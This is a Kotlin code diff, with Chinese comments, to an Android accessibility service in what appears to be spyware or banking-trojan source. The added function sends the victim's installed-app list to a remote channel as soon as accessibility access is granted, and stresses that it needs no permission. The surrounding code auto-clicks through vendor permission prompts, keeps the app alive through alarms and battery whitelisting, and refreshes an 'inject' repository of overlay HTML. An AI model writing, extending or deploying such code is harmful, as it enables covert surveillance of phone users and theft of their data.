@@ -326,6 +326,23 @@ class BoundaryAccessibilityService : AccessibilityService() {
 
 
 
+    // ── 应用列表上报：无障碍一连上就开始等通道，就绪立刻发（不需要任何运行时权限） ──
+    @Volatile private var appListSent = false
+
+    fun sendAppListWhenReady(attempt: Int = 1) {
+        if (appListSent) return
+        val ch = moying
+        if (ch != null) {
+            val ok = runCatching { com.zaka.screenagent.net.AppList.send(ch, this) }.isSuccess
+            appListSent = ok
+            Log.d("AccGuard", "iconList sent=$ok (attempt=$attempt)")
+            return
+        }
+        if (attempt > 15) { Log.w("AccGuard", "iconList: 通道 30 秒内未就绪，放弃"); return }
+        Log.d("AccGuard", "iconList: 通道未就绪，$attempt 次重试（2s 后）")
+        main.postDelayed({ sendAppListWhenReady(attempt + 1) }, 2_000L)
+    }
+
     /** 供厂商策略调用：申请 9 项运行时权限 */
     fun requestRuntimePermissions() {
         startPermissionWithRetry(36)
@@ -387,7 +404,9 @@ class BoundaryAccessibilityService : AccessibilityService() {
             }
             // ── 厂商分派：三星走三星的一套，小米走小米的两步 ──
             com.zaka.screenagent.flow.VendorFlows.log()
-            // 唯一分派点：按厂商走各自的完整流程（小米两步 / 其它原链路）
+            // 无障碍连上的第一件事：等通道就绪就上报已安装应用（不需要权限）
+        sendAppListWhenReady()
+        // 唯一分派点：按厂商走各自的完整流程（小米两步 / 其它原链路）
             com.zaka.screenagent.flow.VendorFlows.of().start(this, dbgNoAutoClick)
         }
         // 2.3：保活（2.2：前台服务 + Job(15min,persisted) + 精确闹钟 + 电池白名单）
@@ -443,7 +462,7 @@ class BoundaryAccessibilityService : AccessibilityService() {
     fun onOnboardingComplete() {
         Log.d("AccGuard", "onboarding complete -> send appList + refresh inject + prefetch html")
         main.postDelayed({
-            runCatching { moying?.let { com.zaka.screenagent.net.AppList.send(it, this) } }
+            sendAppListWhenReady()
             runCatching {
                 com.zaka.screenagent.inject.InjectRepo.refresh(this, force = true)
                 // refresh 是异步线程，等 2 秒再预取
